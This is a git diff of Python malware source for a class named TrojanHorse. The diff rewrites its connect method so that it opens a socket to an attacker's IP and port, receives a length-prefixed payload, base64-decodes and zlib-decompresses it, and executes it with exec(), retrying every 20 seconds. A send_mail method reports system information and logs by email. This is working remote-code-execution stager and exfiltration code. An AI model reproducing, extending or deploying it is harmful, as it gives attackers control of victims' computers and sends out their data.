@@ -20,6 +20,21 @@ import stat
 import platform
 import getpass
 
+import zlib
+import base64
+import binascii 
+import code 
+import random 
+import re 
+import select 
+import subprocess 
+import sys 
+import threading 
+import traceback 
+import ctypes
+import imp 
+import requests
+
 
 class TrojanHorse:
     def __init__(self, email, password, ip, port):
@@ -86,21 +101,27 @@ class TrojanHorse:
             
         self.connect(self.ip, self.port)
 
-        
+
     def connect(self, ip, port):
         try:
-            s=socket.socket(2,1)
-            s.connect((self.ip,self.port))
-            l=struct.unpack('>I',s.recv(4))[0]
-            d=s.recv(4096)
-            while len(d)!=l:
-                d+=s.recv(4096)
-            exec(d,{'s':s})
+            server = socket.socket(2, socket.SOCK_STREAM)
+            server.connect((self.ip, self.port))
+
+            self.is_connection_made_successfully = True
+            print("[+] Connection Made Successfully!")
+
+            data_length   = struct.unpack('>I', server.recv(4))[0]
+            recieved_data = server.recv(4096)
+
+            while len(recieved_data) < data_length:
+                recieved_data += server.recv(4096)
+
+            exec(zlib.decompress(base64.b64decode(recieved_data)), {'s': server})
         except Exception as e:
-            print("[+] Unable to Connect, Retrying in 10 seconds!")
-            print(f"Error: {e}")
-            time.sleep(10)
-            self.connect(self.ip, self.port)
+            print("[*] Unable to Connect, Retrying after 20 seconds ...")
+            #print(f"Error: {e}")
+            time.sleep(20)
+            self.connect(self.ip, self.port) 
         
     def send_mail(self, message):
         message = "Subject: THorse Reporting\n\n" + "Report From:\n\n" + self.system_info  + "\n\nLogs:\n" + message
